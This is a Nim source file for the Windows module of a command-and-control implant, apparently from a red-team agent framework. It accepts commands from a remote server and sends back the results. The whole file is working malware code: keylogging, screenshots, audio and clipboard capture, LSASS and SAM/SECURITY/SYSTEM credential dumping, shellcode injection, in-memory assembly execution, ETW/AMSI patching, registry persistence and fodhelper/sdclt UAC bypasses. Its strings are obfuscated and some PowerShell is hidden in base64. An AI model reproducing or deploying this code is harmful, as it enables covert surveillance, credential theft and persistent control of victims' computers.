# Internal imports
import ../config
import ../common
import utils/incl/[evillsasstwin]
import utils/[audio, clipboard, clr, helpers, memops, lsass, screenshot, keylogger, mutex, critical, priv]
# External imports
import std/[tables, nativesockets, json]
import wAuto/[registry, window]
import winim/[lean, com]
import system/[io]
import httpclient
import threadpool
import nimprotect
import strformat
import strutils
import osproc
import crc32
import net
import os

# Core functions
proc windows_start*(): void
proc windows_parse_command*(command: JsonNode): bool

# Command executors
proc collect_data(): bool
proc wrap_execute_encoded_powershell(encoded_powershell_command: string, ps_module=""): bool
proc spawn_wmi(cmdline: string): bool
proc checksec(): bool
proc wrap_get_clipboard(): bool
proc enum_visible_windows(): bool
proc wrap_get_screenshot(): bool
proc wrap_record_audio(record_time: int): bool
proc wrap_keylog_start(): bool
proc wrap_keylog_dump(): bool
proc wrap_keylog_stop(): bool
proc wrap_examine_lsass(): bool
proc dump_lsass(dump_method: string): bool
proc wrap_evil_lsass_twin(): bool
proc dump_sam(): bool
proc wrap_inject_shellc(shellc_base64: string, pid: int): bool
proc wrap_execute_assembly(assembly_base64: string, assembly_args: string): bool
proc wrap_patch_func(func_name: string): bool
proc set_run_key(key_name: string, cmd: string): bool
proc set_spe(process_name: string, cmd: string): bool
proc uac_bypass(bypass_method: string, cmd: string): bool
proc msgbox(title: string, text: string) {.gcsafe.}
proc speak(text: string): bool
proc wrap_set_critical(is_critical: bool): bool

# Helpers
proc get_windows_agent_id*(): string

# Globals
let client = newHttpClient(userAgent=get_windows_agent_id())
var keylog_on: bool


#########################
### Command executors ###
#########################


proc collect_data(): bool =
    var is_success: bool
    var hostname: string
    var os_version: string
    var process: string
    var username: string
    var is_admin: string
    var is_elevated: string
    var ipv4_local: string
    var ipv4_public: string

    hostname = getHostname()
    try:    
        var wmi = GetObject(protectString("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2"))
        var query = protectString("SELECT * FROM Win32_OperatingSystem")
        for osInfo in wmi.execQuery(query):
            os_version = osInfo.Caption.replace(protectString("Microsoft "), "")
    except:
        os_version = could_not_retrieve
    try:
        process = fmt"[{$getCurrentProcessId()}] {getAppFilename()}"
    except:
        process = could_not_retrieve
    try:
        var obj = CreateObject(protectString("WScript.Network"))
        username = fmt"{obj.userDomain}\{obj.userName}"
    except:
        username = could_not_retrieve
    try:
        is_admin = execute_encoded_powershell(protectString("KABHAGUAdAAtAEwAbwBjAGEAbABHAHIAbwB1AHAATQBlAG0AYgBlAHIAIAAtAE4AYQBtAGUAIABBAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByAHMAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAC0ARQB4AHAAYQBuAGQAUAByAG8AcABlAHIAdAB5ACAAbgBhAG0AZQApACAALQBjAG8AbgB0AGEAaQBuAHMAIABbAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAEkAZABlAG4AdABpAHQAeQBdADoAOgBHAGUAdABDAHUAcgByAGUAbgB0ACgAKQAuAG4AYQBtAGUA"))
    except:
        is_admin = could_not_retrieve
    try:
        is_elevated = capitalizeAscii($is_elevated())
    except:
        is_elevated = could_not_retrieve
    try: 
        ipv4_local = $getPrimaryIPAddr()
    except: 
        ipv4_local = could_not_retrieve
    try:
        ipv4_public = client.getContent(protectString("http://api.ipify.org"))
    except:
        ipv4_public = could_not_retrieve

    var data = {

        protectString("Hostname"): hostname,
        protectString("OS Version"): os_version,
        protectString("Process"): process,
        protectString("Username"): username, 
        protectString("Admin"): is_admin, 
        protectString("Elevated"): is_elevated, 
        protectString("IPV4 Local"): ipv4_local, 
        protectString("IPV4 Public"): ipv4_public
    
    }.toOrderedTable()
    
    is_success = post_data(client, protectString("collect") , $data)

    return is_success


proc wrap_execute_encoded_powershell(encoded_powershell_command: string, ps_module=""): bool = 
    var output: string
    var is_success: bool
    var data: OrderedTable[system.string, system.string]

    # execute the powershell scriptblock
    try:
        output = execute_encoded_powershell(encoded_powershell_command)
    except:
        output = could_not_retrieve
    
    # command came from "iex" module
    if ps_module == "":
        data = {
            protectString("powershell_command"): decode_64(encoded_powershell_command),
            protectString("output"): "\n" & output
        }.toOrderedTable()
        is_success = post_data(client, protectString("iex"), $data)
    
    # command came from ps_module
    else:
        data = {
            protectString("output"): "\n" & output
        }.toOrderedTable()
        is_success = post_data(client, ps_module, $data)

    return is_success


proc spawn_wmi(cmdline: string): bool =
    var wmi = GetObject(protectString("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2:Win32_Process"))
    var res = wmi.Create(cmdline)
    var data = {
        protectString("cmdline"): cmdline,
        protectString("is_success"): $(res == 0),
        protectString("result"): $res
    }.toOrderedTable()
    
    var is_success = post_data(client, protectString("spawn") , $data)

    return is_success


proc checksec(): bool =
    var products = ""
    var is_success: bool
    try:
        var wmi = GetObject(protectString("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\securitycenter2"))
        for i in wmi.execQuery(protectString("SELECT displayName FROM AntiVirusProduct")):
            products = products & protectString("\n[+] ") & $i.displayName
        is_success = true
    except:
        is_success = false
    
    var data = {
        protectString("is_success"): $is_success,
        protectString("products"): products
    }.toOrderedTable()
    
    is_success = post_data(client, protectString("checksec") , $data)

    return is_success


proc wrap_get_clipboard(): bool =
    var clipboard: string
    var is_success: bool
    try:
        clipboard = get_clipboard()
        is_success = true
    except:
        clipboard = could_not_retrieve
        is_success = false
    
    var data = {
        protectString("is_success"): $is_success,
        protectString("clipboard"): "\n" & clipboard
    }.toOrderedTable()
    
    is_success = post_data(client, protectString("clipboard") , $data)

    return is_success


proc enum_visible_windows(): bool =   
    
    var is_success: bool
    var windows = ""

    try:
        for i in windows():
            if i.isVisible() and i.getTitle().len() > 1:
                windows.add(protectString("[+] [") & i.getTitle() & "]\n")
        is_success = true
    except:
        is_success = false
        windows = ""
    
    var data = {
        protectString("is_success"): $is_success,
        protectString("windows"): "\n" & windows
    }.toOrderedTable()
    
    is_success = post_data(client, protectString("windows") , $data)

    return is_success
      

proc wrap_get_screenshot(): bool =
    var screenshot_stream: string
    var is_success: bool
    try:
        screenshot_stream = get_screenshot()
        is_success = true
    except:
        screenshot_stream = could_not_retrieve
        is_success = false
    
    var data = {
        protectString("is_success"): $is_success,
        protectString("screenshot_base64"): encode_64(screenshot_stream, is_bin=true)
    }.toOrderedTable()
    
    is_success = post_data(client, protectString("screenshot") , $data)

    return is_success


proc wrap_record_audio(record_time: int): bool = 
    var is_success: bool
    var file_content_base64: string
    var wav_file = protectString("r.w")

    discard record_audio(wav_file, record_time)

    sleep(2000)

    try:
        file_content_base64 = encode_64(readFile(wav_file), is_bin=true)
        is_success = true
    except:
        file_content_base64 = could_not_retrieve
        is_success = false

    try:
        removeFile(wav_file)
    except:
        discard
    
    var data = {
        protectString("is_success"): $is_success,
        protectString("file_content_base64"): file_content_base64
    }.toOrderedTable
    is_success = post_data(client, protectString("audio") , $data)

    return is_success


proc wrap_keylog_start(): bool =
    var data: OrderedTable[system.string, system.string]
    if keylog_on:
        data = {
            protectString("status"): protectString("keylogger is already on"),
        }.toOrderedTable()
    else:
        keylog_start()
        keylog_on = true
        data = {
            protectString("status"): protectString("keylogger started in a new thread")
        }.toOrderedTable()
    return post_data(client, protectString("keylog-start") , $data)


proc wrap_keylog_dump(): bool = 
    var data: OrderedTable[system.string, system.string]
    if not keylog_on:
        data = {
            protectString("status"): protectString("keylogger is off"),
        }.toOrderedTable()
    else:
        var klout = keylog_dump()
        data = {
            protectString("keystrokes_base64"): encode_64(klout, is_bin=true)
        }.toOrderedTable()
    return post_data(client, protectString("keylog-dump") , $data)


proc wrap_keylog_stop(): bool = 
    var data: OrderedTable[system.string, system.string]
    if not keylog_on:
        data = {
            protectString("status"): protectString("keylogger is already off"),
        }.toOrderedTable()
    else:
        var klout = keylog_stop()
        keylog_on = false
        data = {
            protectString("keystrokes_base64"): encode_64(klout, is_bin=true),
            protectString("status"): protectString("keylogger stopped")
        }.toOrderedTable()
    return post_data(client, protectString("keylog-stop"), $data)


proc wrap_examine_lsass(): bool =
    
    var is_success: bool
    var (lsass_prot_str, lsass_credguard_str) = examine_lsass()
    
    var data = {
        protectString("Lsass protection"): lsass_prot_str,
        protectString("Credential Guard"): lsass_credguard_str
    }.toOrderedTable

    is_success = post_data(client, protectString("lsass-examine") , $data)

    return is_success


proc dump_lsass(dump_method: string): bool = 
    var is_success: bool
    var file_content_base64: string

    case dump_method:
        of protectString("direct"):
            discard dump_lsass_minidumpwritedump()
        of protectString("comsvcs"):
            discard execute_encoded_powershell(protectString("cgB1AG4AZABsAGwAMwAyAC4AZQB4AGUAIABDADoAXAB3AGkAbgBkAG8AdwBzAFwAUwB5AHMAdABlAG0AMwAyAFwAYwBvAG0AcwB2AGMAcwAuAGQAbABsACwAIABNAGkAbgBpAEQAdQBtAHAAIAAoAEcAZQB0AC0AUAByAG8AYwBlAHMAcwAgAGwAcwBhAHMAcwB8ACAAcwBlAGwAZQBjAHQAIAAtAEUAeABwAGEAbgBkAFAAcgBvAHAAZQByAHQAeQAgAGkAZAApACAAbAAuAGQAIABmAHUAbABsAA=="))

    sleep(3000)

    try:
        file_content_base64 = encode_64(readFile(protectString("l.d")), is_bin=true)
        is_success = true
    except:
        file_content_base64 = could_not_retrieve
        is_success = false

    try:
        removeFile(protectString("l.d"))
    except:
        discard
    
    var data = {
        protectString("is_success"): $is_success,
        protectString("file_content_base64"): file_content_base64
    }.toOrderedTable
    is_success = post_data(client, protectString("lsass") , $data)

    return is_success


proc wrap_evil_lsass_twin(): bool =
    var is_success: bool
    var file_content_base64: string

    var dump_string = evil_lsass_twin()
    if dump_string == "":
        is_success = false
        file_content_base64 = could_not_retrieve
    else:
        is_success = true
        file_content_base64 = encode_64(dump_string, is_bin=true)

    var data = {
        protectString("is_success"): $is_success,
        protectString("file_content_base64"): file_content_base64
    }.toOrderedTable
    is_success = post_data(client, protectString("lsass") , $data)

    return is_success


proc dump_sam(): bool =
    var is_success: bool
    var sam_base64: string
    var sec_base64: string
    var sys_base64: string
    var sam_file = protectString("s.am")
    var sec_file = protectString("s.ec")
    var sys_file = protectString("s.ys")

    if execCmdEx(protectString("reg.exe save hklm\\sam ") & sam_file, options={poDaemon}).exitCode == 0 and 
    execCmdEx(protectString("reg.exe save hklm\\security ") & sec_file, options={poDaemon}).exitCode == 0 and 
    execCmdEx(protectString("reg.exe save hklm\\system ") & sys_file, options={poDaemon}).exitCode == 0:
        is_success = true
    else:
        is_success = false

    sleep(3000)

    try:
        sam_base64 = encode_64(readFile(sam_file), is_bin=true)
        sec_base64 = encode_64(readFile(sec_file), is_bin=true)
        sys_base64 = encode_64(readFile(sys_file), is_bin=true)
        is_success = true
    except:
        sam_base64 = could_not_retrieve
        sec_base64 = could_not_retrieve
        sys_base64 = could_not_retrieve
        is_success = false

    try:
        removeFile(sam_file)
        removeFile(sec_file)
        removeFile(sys_file)
    except:
        discard
    
    var data = {
        protectString("is_success"): $is_success,
        protectString("sam_base64"): sam_base64,
        protectString("sec_base64"): sec_base64,
        protectString("sys_base64"): sys_base64
    }.toOrderedTable

    is_success = post_data(client, protectString("sam") , $data)


proc wrap_inject_shellc(shellc_base64: string, pid: int): bool =

    var shellc_bytes = to_bytes(decode_64(shellc_base64, is_bin=true))
    var is_success = inject_shellcode(shellc_bytes, pid)
    
    var data = {
        protectString("pid"): $pid,
        protectString("is_success"): $is_success,
    }.toOrderedTable

    is_success = post_data(client, protectString("shellc") , $data)


proc wrap_execute_assembly(assembly_base64: string, assembly_args: string): bool =
    var is_success: bool
    var output: string
    
    (is_success, output) = execute_assembly(assembly_base64, assembly_args)
    
    var data = {
        protectString("is_success"): $is_success,
        protectString("output"): output
    }.toOrderedTable()
    
    is_success = post_data(client, protectString("assembly"), $data)

    return is_success


proc wrap_patch_func(func_name: string): bool =
    
    var is_success = patch_func(func_name)
    var data = {
        protectString("patch"): func_name,
        protectString("is_success"): $is_success
    }.toOrderedTable()
    
    is_success = post_data(client, protectString("patch") , $data)

    return is_success


proc set_run_key(key_name: string, cmd: string): bool =
    var is_success = false
    let run_path = protectString("\\Software\\Microsoft\\Windows\\CurrentVersion\\Run")
    var added_path = ""
    
    for hive in [protectString("HKLM"), protectString("HKCU")]:
        if regWrite(hive & run_path, key_name, cmd):
            is_success = true  
            added_path = hive & run_path & protectString(" -> ") & key_name
            break
    
    var data = {
        protectString("registry_path"): added_path,
        protectString("persistence_command"): cmd,
        protectString("is_success"): $is_success
    }.toOrderedTable()

    is_success = post_data(client, protectString("persist-run"), $data)
    
    return is_success


proc set_spe(process_name: string, cmd: string): bool =
    var is_success = false

    if regWrite(protectString("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\") & process_name, protectString("GlobalFlag"), 512) and 
    regWrite(protectString("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\") & process_name, protectString("ReportingMode"), 1) and 
    regWrite(protectString("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\") & process_name, protectString("MonitorProcess"), cmd):
        is_success = true
    
    var data = {
        protectString("triggering_process"): process_name,
        protectString("persistence_command"): cmd,
        protectString("is_success"): $is_success

    }.toOrderedTable()
    
    is_success = post_data(client, protectString("persist-spe"), $data)

    return is_success


proc uac_bypass(bypass_method: string, cmd: string): bool =
    var is_success = false
    var is_success_post: bool
    var reg_path: string
    var launch: string

    case bypass_method:
    of protectString("fodhelper"):
        reg_path = protectString("HKCU\\software\\classes\\ms-settings\\shell\\open\\command")
        launch = protectString("cmd /c fodhelper.exe")
    of protectString("sdclt"):
        reg_path = protectString("HKCU\\Software\\Classes\\Folder\\shell\\open\\command")
        launch = protectString("cmd /c sdclt.exe")
    else:
        return false
    
    if regWrite(reg_path, "", cmd) and regWrite(reg_path, protectString("DelegateExecute"), ""):
        sleep(1000)
        if execCmdEx(launch, options={poDaemon}).exitCode == 0:
            sleep(5000)
            if is_elevated_mutex_enabled():
                is_success = true
            else:
                is_success = false

    var data = {
        protectString("elevated_command"): cmd,
        protectString("is_success"): $is_success
    }.toOrderedTable
    
    is_success_post = post_data(client, protectString("uac-") & bypass_method , $data)

    sleep(1000)
    regDelete(reg_path, "")
    regDelete(reg_path, protectString("DelegateExecute"))

    if is_success == true:
        ExitProcess(0)
    else:
        return is_success_post


proc msgbox(title: string, text: string) {.gcsafe.} =
    # spawn in a new thread
    MessageBox(0, text, title, 0)


proc speak(text: string): bool =
    var is_success: bool
    
    try:
        var voice_obj = CreateObject(protectString("SAPI.SpVoice"))
        voice_obj.volume = 100
        voice_obj.speak(text)
        is_success = true
    except:
        is_success = false

    var data = {
        protectString("text"): text,
        protectString("is_success"): $is_success
    }.toOrderedTable()
    
    is_success = post_data(client, protectString("speak") , $data)
    return is_success


proc wrap_set_critical(is_critical: bool): bool =

    var is_success = set_critical(is_critical) == 0
    
    var data = {
        protectString("is_critical"): $is_critical,
        protectString("is_success"): $is_success
    }.toOrderedTable()

    is_success = post_data(client, protectString("critical") , $data)
    return is_success


#########################
######## Helpers ########
#########################


proc get_windows_agent_id*(): string =
    var uuid: string
    var guid: string

    try:
        uuid = execute_encoded_powershell(protectString("KABHAGUAdAAtAEMAaQBtAEkAbgBzAHQAYQBuAGMAZQAgAC0AQwBsAGEAcwBzACAAVwBpAG4AMwAyAF8AQwBvAG0AcAB1AHQAZQByAFMAeQBzAHQAZQBtAFAAcgBvAGQAdQBjAHQAKQAuAFUAVQBJAEQA"))
    except:
        uuid = could_not_retrieve
    try:
        guid = execute_encoded_powershell(protectString("RwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AcABhAHQAaAAgAEgASwBMAE0AOgBcAFMATwBGAFQAVwBBAFIARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAQwByAHkAcAB0AG8AZwByAGEAcABoAHkAIAB8ACAAcwBlAGwAZQBjAHQAIAAtAEUAeABwAGEAbgBkAFAAcgBvAHAAZQByAHQAeQAgAE0AYQBjAGgAaQBuAGUARwB1AGkAZAA="))
    except:
        guid = could_not_retrieve
    var uaid = uuid & guid
    crc32(uaid)
    return uaid.toLower()


##########################
##### Core functions #####
##########################


proc windows_start*(): void =

    # if elevated - let the unelevated agent know (needed for uac bypass commands)
    if is_elevated():
        discard create_elevated_mutex()
    
    sleep(sleep_on_execution * 1000)
    let binary_path = getAppFilename()
    if is_exe and reloc_on_exec_windows and (binary_path != agent_execution_path_windows):
        # copy and execute to the target path
        var agent_execution_dir = splitFile(agent_execution_path_windows)[0]
        createDir(agent_execution_dir)
        copyFile(binary_path, agent_execution_path_windows)
        discard startProcess(agent_execution_path_windows, options={poDaemon})
        quit()
    else:
        # patch etw & amsi as needed
        var is_etw_success: string
        var is_amsi_success: string
        if patch_etw_on_start:
            is_etw_success = $patch_func(protectString("etw"))
        else:
            is_etw_success = protectString("skipped")
        if patch_amsi_on_start:
            is_amsi_success = $patch_func(protectString("amsi"))
        else:
            is_amsi_success = protectString("skipped")
        
        # collect agent data
        discard collect_data()
        
        # report etw & amsi patching status
        if patch_etw_on_start or patch_amsi_on_start:
            var data = {
                protectString("patch_etw"): is_etw_success,
                protectString("patch_amsi"): is_amsi_success
            }.toTable 
            discard post_data(client, protectString("patch") , $data)



proc windows_parse_command*(command: JsonNode): bool =
    var is_success: bool
    var command_type = command[protectString("command_type")].getStr()

    case command_type:
        # for external common procs - pass the http client as first argument
        of protectString("cmd"):
            is_success = run_shell_command(client, command[protectString("shell_command")].getStr())
        of protectString("iex"):
            # direct iex
            if not contains(command, protectString("ps_module")):
                is_success = wrap_execute_encoded_powershell(command[protectString("encoded_powershell_command")].getStr())
            # ps_modules
            else:
                is_success = wrap_execute_encoded_powershell(command[protectString("encoded_powershell_command")].getStr(), command[protectString("ps_module")].getStr())
        of protectString("spawn"):
            is_success = spawn_wmi(command[protectString("cmdline")].getStr())
        of protectString("download"):
            is_success = exfil_file(client, command[protectString("src_file")].getStr())
        of protectString("upload"):
            is_success = write_file(client, command[protectString("src_file_data_base64")].getStr(), command[protectString("dst_file_path")].getStr())            
        of protectString("checksec"):
            is_success = checksec()
        of protectString("clipboard"):
            is_success = wrap_get_clipboard()
        of protectString("screenshot"):
            is_success = wrap_get_screenshot()
        of protectString("windows"):
            is_success = enum_visible_windows()
        of protectString("audio"):
            is_success = wrap_record_audio(command[protectString("record_time")].getInt())
        of protectString("lsass-examine"):
            is_success = wrap_examine_lsass()
        of protectString("lsass"):
            var dump_method = command[protectString("dump_method")].getStr()
            if dump_method == protectString("eviltwin"):
                is_success = wrap_evil_lsass_twin()
            else:
                is_success = dump_lsass(dump_method)
        of protectString("sam"):
            is_success = dump_sam()
        of protectString("shellc"):
            is_success = wrap_inject_shellc(command[protectString("shellc_base64")].getStr(), command[protectString("pid")].getInt())
        of protectString("assembly"):
            is_success = wrap_execute_assembly(command[protectString("assembly_base64")].getStr(), command[protectString("assembly_args")].getStr())
        of protectString("keylog"):
            var keylog_action = command[protectString("action")].getStr()
            if keylog_action == protectString("start"):
                is_success = wrap_keylog_start()
            elif keylog_action == protectString("dump"):
                is_success = wrap_keylog_dump()
            if keylog_action == protectString("stop"):
                is_success = wrap_keylog_stop()                                
        of protectString("patch"):
            is_success = wrap_patch_func(command[protectString("patch_func")].getStr())
        of protectString("persist-run"):
            is_success = set_run_key(command[protectString("key_name")].getStr(), command[protectString("persist_command")].getStr())
        of protectString("persist-spe"):
            is_success = set_spe(command[protectString("process_name")].getStr(), command[protectString("persist_command")].getStr())
        of protectString("uac-bypass"):
            is_success = uac_bypass(command[protectString("bypass_method")].getStr(), command[protectString("elevated_command")].getStr())
        of protectString("msgbox"):
            # spawn in a new thread
            var title = command[protectString("title")].getStr()
            var text = command[protectString("text")].getStr()
            spawn msgbox(title, text)
            var data = {
                protectString("msgbox_content"): "[" & title & "] " & text,
                protectString("status"): protectString("spawned in a new thread")
                }.toOrderedTable()
            discard post_data(client, protectString("msgbox") , $data)
        of protectString("speak"):
            is_success = speak(command["text"].getStr())
        of protectString("critical"):
            is_success = wrap_set_critical(parseBool(command[protectString("is_critical")].getStr()))
        of protectString("sleep"):
            is_success = change_sleep_time(client, command[protectString("timeframe")].getInt(), command[protectString("jitter_percent")].getInt())
        of protectString("collect"):
            is_success = collect_data()
        of protectString("die"):
            die(client)

        else:
            is_success = false
    return is_success
